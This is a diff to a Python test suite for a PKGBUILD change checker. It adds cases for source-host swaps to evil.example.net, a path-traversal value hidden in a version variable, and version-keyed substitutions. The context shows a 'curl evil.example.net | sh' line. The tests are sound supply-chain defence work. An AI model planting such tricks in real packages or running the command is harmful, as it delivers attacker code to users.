@@ -119,6 +119,72 @@ ATTACKS = {
            '  cat > "$pkgdir/usr/bin/x" << EOF\n#!/bin/sh\ncurl evil.example.net | sh\nEOF'),
 }
 
+
+def bump(text, old, new):
+    """`text` with pkgver moved from `old` to `new` and a new checksum, as a real bump has."""
+    return sub(sub(text, f"pkgver={old}", f"pkgver={new}"),
+               "aaaa1111bbbb2222cccc3333dddd4444eeee5555ffff6666aaaa7777bbbb8888",
+               "1234111122223333cccc3333dddd4444eeee5555ffff6666aaaa7777bbbb8888")
+
+
+# rakudo-bin writes its URL using ${pkgver//_/-}: pkgver 2026.07_01 fetches
+# rakudo-moar-2026.07-01-..., thus the literal value does not appear in the
+# URL at any time. Prior to 2026-10-01, each release of it stopped the
+# nightly run.
+TRANSFORMED = sub(sub(BASE, "pkgver=1.2.3", "pkgver=2026.07_01"),
+                  "https://example.org/demo-$pkgver.tar.gz",
+                  "https://example.org/demo-${pkgver//_/-}.tar.gz")
+
+# hardened_malloc: pkgver=13, accompanied by a git tag named after it. A
+# value this brief is never replaced literally, as it would otherwise match
+# digits in any position.
+SHORT_TAG = sub(sub(BASE, "pkgver=1.2.3", "pkgver=13"),
+                "https://example.org/demo-$pkgver.tar.gz",
+                "git+https://example.org/demo.git#tag=$pkgver")
+
+# A helper variable built from the version, in the manner that the nvidia
+# packages build `_pkg` -- here with a transformation, which is recognised
+# only by following its definition.
+HELPER_PKG = sub(sub(BASE, "pkgrel=1", 'pkgrel=1\n_pkg="demo-${pkgver//./_}"'),
+                 "https://example.org/demo-$pkgver.tar.gz",
+                 "https://example.org/$_pkg.tar.gz")
+
+# A second version variable that names a directory located on the download
+# server.
+HELPER_VER = sub(sub(BASE, "pkgrel=1", "pkgrel=1\n_ver=1.2.0"),
+                 "https://example.org/demo-$pkgver.tar.gz",
+                 "https://example.org/releases/$_ver/demo-$pkgver.tar.gz")
+
+# A version that shifts within a URL that remains unaltered is waved through.
+# These make sure that this mechanism cannot be used to move the URL itself.
+# Each pair consists of (old, new).
+VERSION_ATTACKS = {
+    "version bump with source host swapped": (BASE, sub(
+        bump(BASE, "1.2.3", "1.2.4"), "https://example.org/", "https://evil.example.net/")),
+    "${pkgver//_/-} bump with host swapped": (TRANSFORMED, sub(
+        bump(TRANSFORMED, "2026.07_01", "2026.09_01"),
+        "https://example.org/", "https://evil.example.net/")),
+    "short version bump with host swapped": (SHORT_TAG, sub(
+        bump(SHORT_TAG, "13", "14"), "git+https://example.org/", "git+https://evil.example.net/")),
+    # curl removes the dot segments, resulting in this retrieving
+    # /attacker/demo-1.2.4.tar.gz. Before 2026-10-01, it passed: any value
+    # starting with a digit was considered a version.
+    "version variable that carries a path": (HELPER_VER, sub(
+        bump(HELPER_VER, "1.2.3", "1.2.4"), "_ver=1.2.0", "_ver=1.2.0/../../../attacker")),
+    # Yields the old URL at each version except the one currently being
+    # introduced, so comparing the new text at the old version would let it
+    # through.
+    "substitution keyed on the new version": (BASE, sub(
+        bump(BASE, "1.2.3", "1.2.4"), "https://example.org/demo-$pkgver.tar.gz",
+        "https://example.org/demo-${pkgver/1.2.4/1.2.4-evil}.tar.gz")),
+    # The identical manoeuvre one variable away, concealed behind an entry
+    # whose text remains unchanged.
+    "helper keyed on the new version": (
+        sub(HELPER_PKG, '_pkg="demo-${pkgver//./_}"', '_pkg="demo-$pkgver"'),
+        sub(bump(HELPER_PKG, "1.2.3", "1.2.4"), '_pkg="demo-${pkgver//./_}"',
+            '_pkg="demo-${pkgver/1.2.4/1.2.4-evil}"')),
+}
+
 # A local source written as a URL. Both spellings mean the same file beside the
 # PKGBUILD, and both used to be skipped as remote artefacts: the entry holds
 # "://" and "$", the checksum is SKIP because hashing a file that travels in the
@@ -172,6 +238,20 @@ BENIGN = {
     "unrelated file changed": lambda t: t,  # paired with a README edit below
 }
 
+# Version bumps in the shapes that real packages use. Each one involves
+# (old, new).
+VERSION_BENIGN = {
+    "version bump through ${pkgver//_/-}": (
+        TRANSFORMED, bump(TRANSFORMED, "2026.07_01", "2026.09_01")),
+    "short version bump in a git tag": (SHORT_TAG, bump(SHORT_TAG, "13", "14")),
+    "version bump through a helper variable": (
+        HELPER_PKG, bump(HELPER_PKG, "1.2.3", "1.2.4")),
+    "${pkgver//_/-} bump in provides=": (
+        sub(TRANSFORMED, "provides=('demo')", 'provides=("demo=${pkgver//_/-}")'),
+        sub(bump(TRANSFORMED, "2026.07_01", "2026.09_01"),
+            "provides=('demo')", 'provides=("demo=${pkgver//_/-}")')),
+}
+
 
 def run(cmd, cwd=None):
     r = subprocess.run(cmd, cwd=cwd, capture_output=True, text=True)
@@ -180,11 +260,11 @@ def run(cmd, cwd=None):
     return r
 
 
-def build_repo(tmp, new_pkgbuild, extra_new=None, extra_old=None):
+def build_repo(tmp, new_pkgbuild, extra_new=None, extra_old=None, old_pkgbuild=BASE):
     run(["git", "init", "-q", tmp])
     run(["git", "config", "user.email", "t@t"], cwd=tmp)
     run(["git", "config", "user.name", "t"], cwd=tmp)
-    files = {"PKGBUILD": BASE, "local-fix.patch": PATCH, "demo.install": INSTALL,
+    files = {"PKGBUILD": old_pkgbuild, "local-fix.patch": PATCH, "demo.install": INSTALL,
              "README": "hello\n"}
     files.update(extra_old or {})
     for name, content in files.items():
@@ -213,11 +293,11 @@ def main():
     failures = []
     checked = 0
 
-    def case(label, expect_abort, new_text, extra_new=None):
+    def case(label, expect_abort, new_text, extra_new=None, old_text=BASE):
         nonlocal checked
         checked += 1
         with tempfile.TemporaryDirectory() as tmp:
-            old, new = build_repo(tmp, new_text, extra_new=extra_new)
+            old, new = build_repo(tmp, new_text, extra_new=extra_new, old_pkgbuild=old_text)
             rc, out = verdict(tmp, old, new)
         aborted = rc == 2
         if rc == 1:
@@ -232,6 +312,8 @@ def main():
     print("attacks (must abort):")
     for label, mutate in ATTACKS.items():
         case(label, True, mutate(BASE))
+    for label, (old_text, new_text) in VERSION_ATTACKS.items():
+        case(label, True, new_text, old_text=old_text)
     def file_case(label, expect_abort, spec):
         nonlocal checked
         fname, content = spec[0], spec[1]
@@ -294,6 +376,8 @@ def main():
     for label, mutate in BENIGN.items():
         extra = {"README": "hello world\n"} if label == "unrelated file changed" else None
         case(label, False, mutate(BASE), extra_new=extra)
+    for label, (old_text, new_text) in VERSION_BENIGN.items():
+        case(label, False, new_text, old_text=old_text)
 
     print()
     if failures:
